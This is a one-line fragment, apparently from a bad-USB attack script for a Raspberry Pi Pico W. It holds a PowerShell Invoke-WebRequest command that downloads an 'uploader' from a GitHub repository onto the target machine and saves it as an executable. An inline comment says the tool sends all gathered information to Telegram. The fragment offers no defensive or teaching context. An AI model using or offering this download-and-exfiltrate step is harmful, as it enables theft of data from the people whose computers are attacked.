...
Invoke-WebRequest https://raw.githubusercontent.com/McKiller1599/pico-w-bad-usb/main/telegram_uploader.py -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
